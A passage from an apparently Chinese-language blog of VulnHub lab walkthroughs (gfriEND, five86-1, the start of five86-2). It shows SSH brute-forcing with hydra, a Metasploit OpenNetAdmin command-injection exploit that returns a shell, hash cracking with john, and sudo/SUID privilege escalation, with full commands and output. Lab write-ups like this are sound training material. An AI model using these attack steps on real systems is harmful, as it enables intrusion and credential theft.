将所获取的账户与密码写入文件，再添加两个常用词</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat dic</span><br><span class="line"></span><br><span class="line">eweuhtandingan</span><br><span class="line">skuyatuh</span><br><span class="line">aingmaung</span><br><span class="line">qwerty!!!</span><br><span class="line">sundatea</span><br><span class="line">indONEsia</span><br><span class="line">sedihaingmah</span><br><span class="line">cedihhihihi</span><br><span class="line">alice</span><br><span class="line">4lic3</span><br><span class="line">abdikasepak</span><br><span class="line">dorrrrr</span><br><span class="line">admin</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>利用hydra对SSH服务进行爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -L dic -P dic  -v -e ns ssh:&#x2F;&#x2F;192.168.31.164</span><br><span class="line">    [22][ssh] host: 192.168.31.164   login: alice   password: 4lic3</span><br></pre></td></tr></table></figure>
<p>成功获取账户</p>
<h2 id="权限提升-8"><a class="markdownIt-Anchor" href="#权限提升-8"></a> 权限提升</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh alice@192.168.31.164</span><br><span class="line">    4lic3</span><br></pre></td></tr></table></figure>
<p>查看sudo权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for alice on gfriEND:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User alice may run the following commands on gfriEND:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;php</span><br></pre></td></tr></table></figure>
<p>用sudo权限使用php来进行提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo php -r &quot;system(&#39;&#x2F;bin&#x2F;bash&#39;);&quot;</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>密码共用</p>
</blockquote>
<p>值得一提的是，除了WEB服务中alice账户可以用于登入SSH服务之外，数据库的密码(<code>/var/www/html/config/config.php</code>)也是root用户的口令。进行靶机渗透时经常会出现这种状况，当获取到一些账户时，不妨试着在后台运行一下hydra。现实中这种情况也很常见，虽然理想状态下每个密码都足够复杂而且各不相同，但终将只是理想状态罢了。</p>
<blockquote>
<p>Mysql</p>
</blockquote>
<p>渗透过程中也尝试过针对user_id参数进行SQL注入，但是也没有进展，回过头想一下nmap扫描端口时并未发现Mysql服务。后来在网上看了一下，mysql可以设置为仅本地访问(localhost/127.0.0.1/0.0.0.0)。</p>
<blockquote>
<p>sudo</p>
</blockquote>
<p>之前对于<code>sudo</code>的理解还是不够透彻，仅仅单纯地以为sudo权限就是<code>sudo -i</code>直接提root，或者sudo接命令，片面地认为sudo权限是在账号层面上的。实则可以更为细化，如让账户可以以sudo权限执行某些命令。</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ftl1012/p/sudo.html">sudo</a><br />
<a target="_blank" rel="noopener" href="http://www.freesion.com/article/4895226687/">wp</a><br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/longyao/p/11719579.html">mysql</a></p>
</blockquote>
<hr />
<h1 id="five86-1"><a class="markdownIt-Anchor" href="#five86-1"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/five86-1,417/">five86-1</a></h1>
<p><code>2020/03/08 18:20:27</code></p>
<h2 id="端口扫描-9"><a class="markdownIt-Anchor" href="#端口扫描-9"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -Pn -T5 -sV -A -n -v 192.168.31.209</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.209</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)</span><br><span class="line">|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)</span><br><span class="line">|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)</span><br><span class="line">80&#x2F;tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_&#x2F;ona</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">10000&#x2F;tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 6E79CCAA5DCB1FD29C6A7C795BBD608E</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; Charset&#x3D;iso-8859-1).</span><br><span class="line">MAC Address: 08:00:27:D8:1F:90 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 7.882 days (since Sat Feb 29 08:12:28 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-9"><a class="markdownIt-Anchor" href="#web路径枚举-9"></a> Web路径枚举</h2>
<p><code>dirb http://192.168.31.209/ -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.209&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;index.html (CODE:200|SIZE:30)                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;reports (CODE:401|SIZE:461)                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;robots.txt (CODE:200|SIZE:29)                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/reports</code>路径需要进行basic认证</li>
<li>访问<code>/robots.txt</code>，得到如下内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;ona</span><br></pre></td></tr></table></figure>
<ul>
<li>路径<code>/ona</code>下运行的是&quot;opennetadmin v18.1.1&quot;</li>
<li>10000端口上的webmin服务需要账户</li>
</ul>
<h2 id="漏洞利用-9"><a class="markdownIt-Anchor" href="#漏洞利用-9"></a> 漏洞利用</h2>
<ul>
<li>opennetadmin存在RCE漏洞</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution                | exploits&#x2F;php&#x2F;webapps&#x2F;26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits&#x2F;php&#x2F;webapps&#x2F;47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution                  | exploits&#x2F;php&#x2F;webapps&#x2F;47691.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>webmin存在RCE漏洞但是需要提供账户</li>
</ul>
<p>在MSF中使用ona的RCE漏洞利用模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;opennetadmin_ping_cmd_injection</span><br><span class="line">set RHOST 192.168.31.209</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>获取shell</p>
<blockquote>
<p>当时MSF在kali源上的最新版本为5.0.76，而github上已更新到5.0.79，而且该RCE漏洞模块是在5.0.77版本加入MSF，所以需要手动将漏洞模块导入MSF，详情见下文</p>
</blockquote>
<h2 id="权限提升-9"><a class="markdownIt-Anchor" href="#权限提升-9"></a> 权限提升</h2>
<p>查看文件<code>/var/www/html/reports/.htaccess</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;reports&#x2F;.htaccess</span><br><span class="line"></span><br><span class="line">AuthType Basic</span><br><span class="line">AuthName &quot;Restricted Area&quot;</span><br><span class="line">AuthUserFile &#x2F;var&#x2F;www&#x2F;.htpasswd</span><br><span class="line">require valid-user</span><br></pre></td></tr></table></figure>
<p>查看文件<code>/var/www/.htpasswd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;.htpasswd </span><br><span class="line"></span><br><span class="line">douglas:$apr1$9fgG&#x2F;hiM$BtsL9qpNHUlylaLxk81qY1</span><br><span class="line"></span><br><span class="line"># To make things slightly less painful (a standard dictionary will likely fail),</span><br><span class="line"># use the following character set for this 10 character password: aefhrt</span><br></pre></td></tr></table></figure>
<p>得到账户douglas的密码hash与密码的相关信息</p>
<ul>
<li>由字符aefhrt组成</li>
<li>长度为十位</li>
</ul>
<p>将hash保存到本地<br />
<code>echo 'douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' &gt; passwd</code></p>
<p>使用crunch构造字典<br />
<code>crunch 10 10 aefhrt -o pass</code></p>
<p>使用john爆破hash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;pass --format&#x3D;md5crypt passwd</span><br><span class="line">john --show passwd</span><br><span class="line">    douglas:fatherrrrr</span><br></pre></td></tr></table></figure>
<p>使用douglas账户登入目标主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh douglas:192.168.31.206</span><br><span class="line">fatherrrrr</span><br></pre></td></tr></table></figure>
<p>查看sudo权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for douglas on five86-1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User douglas may run the following commands on five86-1:</span><br><span class="line">    (jen) NOPASSWD: &#x2F;bin&#x2F;cp</span><br></pre></td></tr></table></figure>
<p>可以以用户jen身份执行cp命令</p>
<p>生成ssh秘钥，拷贝至jen账户的home目录中，切换至账户jen</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;jen@127.0.0.1&quot;</span><br><span class="line">cp &#x2F;home&#x2F;douglas&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;tmp&#x2F;authorized_keys</span><br><span class="line">sudo -u jen cp &#x2F;tmp&#x2F;authorized_keys &#x2F;home&#x2F;jen&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>
<p>登入信息中得到提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have new mail.</span><br></pre></td></tr></table></figure>
<p>查看邮件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;mail&#x2F;jen</span><br><span class="line"></span><br><span class="line">From roy@five86-1 Wed Jan 01 03:17:00 2020</span><br><span class="line">Return-path: &lt;roy@five86-1&gt;</span><br><span class="line">Envelope-to: jen@five86-1</span><br><span class="line">Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line">Received: from roy by five86-1 with local (Exim 4.92)</span><br><span class="line">	(envelope-from &lt;roy@five86-1&gt;)</span><br><span class="line">	id 1imZBc-0001FU-El</span><br><span class="line">	for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line">To: jen@five86-1</span><br><span class="line">Subject: Monday Moss</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1imZBc-0001FU-El@five86-1&gt;</span><br><span class="line">From: Roy Trenneman &lt;roy@five86-1&gt;</span><br><span class="line">Date: Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line"></span><br><span class="line">Hi Jen,</span><br><span class="line"></span><br><span class="line">As you know, I&#39;ll be on the &quot;customer service&quot; course on Monday due to that incident on Level 4 with the accounts people.</span><br><span class="line"></span><br><span class="line">But anyway, I had to change Moss&#39;s password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!</span><br><span class="line"></span><br><span class="line">Moss will understand (ha ha ha ha).</span><br><span class="line"></span><br><span class="line">Tanks,</span><br><span class="line">Roy</span><br></pre></td></tr></table></figure>
<p>获得账户moss的密码</p>
<p>切换至账户moss</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su moss</span><br><span class="line">Fire!Fire!</span><br></pre></td></tr></table></figure>
<p>在路径<code>/home/moss</code>下发现隐藏文件夹<code>.game</code><br />
进入文件夹<code>.game</code>之后发现存在一个root权限的文件<code>upyourgame</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------ 2 moss moss  4096 Jan  1 03:53 .</span><br><span class="line">drwx------ 3 moss moss  4096 Jan  1 23:05 ..</span><br><span class="line">lrwxrwxrwx 1 moss moss    21 Jan  1 03:21 battlestar -&gt; &#x2F;usr&#x2F;games&#x2F;battlestar</span><br><span class="line">lrwxrwxrwx 1 moss moss    14 Jan  1 03:23 bcd -&gt; &#x2F;usr&#x2F;games&#x2F;bcd</span><br><span class="line">lrwxrwxrwx 1 moss moss    21 Jan  1 03:21 bombardier -&gt; &#x2F;usr&#x2F;games&#x2F;bombardier</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:22 empire -&gt; &#x2F;usr&#x2F;games&#x2F;empire</span><br><span class="line">lrwxrwxrwx 1 moss moss    20 Jan  1 03:23 freesweep -&gt; &#x2F;usr&#x2F;games&#x2F;freesweep</span><br><span class="line">lrwxrwxrwx 1 moss moss    15 Jan  1 03:23 hunt -&gt; &#x2F;usr&#x2F;games&#x2F;hunt</span><br><span class="line">lrwxrwxrwx 1 moss moss    20 Jan  1 03:22 ninvaders -&gt; &#x2F;usr&#x2F;games&#x2F;ninvaders</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:19 nsnake -&gt; &#x2F;usr&#x2F;games&#x2F;nsnake</span><br><span class="line">lrwxrwxrwx 1 moss moss    25 Jan  1 03:21 pacman4console -&gt; &#x2F;usr&#x2F;games&#x2F;pacman4console</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:22 petris -&gt; &#x2F;usr&#x2F;games&#x2F;petris</span><br><span class="line">lrwxrwxrwx 1 moss moss    16 Jan  1 03:22 snake -&gt; &#x2F;usr&#x2F;games&#x2F;snake</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:20 sudoku -&gt; &#x2F;usr&#x2F;games&#x2F;sudoku</span><br><span class="line">-rwsr-xr-x 1 root root 16824 Jan  1 03:52 upyourgame</span><br><span class="line">lrwxrwxrwx 1 moss moss    16 Jan  1 03:22 worms -&gt; &#x2F;usr&#x2F;games&#x2F;worms</span><br></pre></td></tr></table></figure>
<p>执行之后任意输入五次即可进入root权限下的sh</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;upyourgame </span><br><span class="line">Would you like to play a game? 1</span><br><span class="line"></span><br><span class="line">Could you please repeat that? 1</span><br><span class="line"></span><br><span class="line">Nope, you&#39;ll need to enter that again. 1</span><br><span class="line"></span><br><span class="line">You entered: No.  Is this correct? 1</span><br><span class="line"></span><br><span class="line">We appear to have a problem?  Do we have a problem? 1</span><br><span class="line"></span><br><span class="line">Made in Britain.</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;1001(moss) groups&#x3D;1001(moss)</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>手动导入MSF模块</p>
</blockquote>
<p>searchsploit命令找到了存储于本地的MSF漏洞利用模块，其路径为</p>
<p><code>/usr/share/exploitdb/exploits/linux/webapps/47772.rb</code></p>
<p>执行如下命令即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;webapps&#x2F;47772.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;linux&#x2F;http&#x2F;opennetadmin_ping_cmd_injection.rb</span><br><span class="line">chmod 644 opennetadmin_ping_cmd_injection.rb.rb</span><br></pre></td></tr></table></figure>
<p>之后在MSF中执行<code>reload_all</code></p>
<blockquote>
<p>cp提权</p>
</blockquote>
<p>之前看到有文章大概列举了一下SUID提权的几个指令，其中有cp命令，但是没有文章没有列举出详细的操作过程<br />
个人想法是用root权限的cp命令去覆盖掉passwd文件，这次靶机渗透学到了用cp命令去写入ssh信任秘钥来进行水平提权<br />
大概不能将同样的套路用于垂直提权至root，因为一般ssh默认禁止掉了root登入</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kuaile1314/p/12252563.html">WP</a></p>
</blockquote>
<hr />
<h1 id="five86-2"><a class="markdownIt-Anchor" href="#five86-2"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/five86-2,418/">five86-2</a></h1>
<p><code>2020/03/15 21:54:23</code></p>
<h2 id="端口扫描-10"><a class="markdownIt-Anchor" href="#端口扫描-10"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -Pn -T5 -sV -A -n -v 192.168.31.209</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.51</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">21&#x2F;tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80&#x2F;tcp open   ssl&#x2F;http Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http:&#x2F;&#x2F;192.168.31.51&#x2F;</span><br><span class="line">MAC Address: 08:00:27:29:D0:EB (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose|storage-misc|WAP|media device</span><br><span class="line">Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (95%), HP embedded (91%), Netgear RAIDiator 4.X (91%), Ubiquiti AirOS 5.X (90%), ZyXEL embedded (90%), Ubiquiti embedded (90%)</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6 cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;h:hp:p2000_g3 cpe:&#x2F;o:netgear:raidiator:4.2.24 cpe:&#x2F;o:ubnt:airos:5.2.6 cpe:&#x2F;o:linux:linux_kernel:2.6.32 cpe:&#x2F;h:ubnt:airmax_nanostation</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 - 3.13 (95%), Linux 2.6.22 - 2.6.36 (93%), Linux 2.6.32 - 2.6.39 (93%), Linux 2.6.37 (93%), Linux 3.10 - 4.11 (93%), Linux 2.6.39 (93%), Linux 2.6.32 (92%), Linux 3.2 - 4.9 (92%), Linux 2.6.32 - 3.10 (92%), HP P2000 G3 NAS device (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 32.468 days (since Tue Feb 11 09:55:14 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-10"><a class="markdownIt-Anchor" href="#web路径枚举-10"></a> Web路径枚举</h2>
<p><code>dirb http://192.168.31.51/ -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.51&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.51&#x2F;index.php (CODE:301|SIZE:0)                                           </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.51&#x2F;server-status (CODE:403|SIZE:278)                                     </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-admin&#x2F;                                                </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-content&#x2F;                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-includes&#x2F;                                             </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.51&#x2F;xmlrpc.php (CODE:405|SIZE:42)</span><br></pre></td></tr></table></figure>
<ul>
<li>80端口上仅存在Wordpress服务框架</li>
</ul>
<h2 id="漏洞利用-10"><a class="markdownIt-Anchor" href="#漏洞利用-10"></a> 漏洞利用</h2>
<ul>
<li>未找到FTP服务版本相关漏洞</li>
<li>Wordpress深入信息收集</li>
<li>未挖掘出有漏洞的插件或主题</li>
<li>用户枚举</li>
</ul>
<p><code>wpscan --url http://192.168.31.51/ -e u</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] barney</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] gillian</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] peter</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] stephen</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>构造用户字典文件</p>
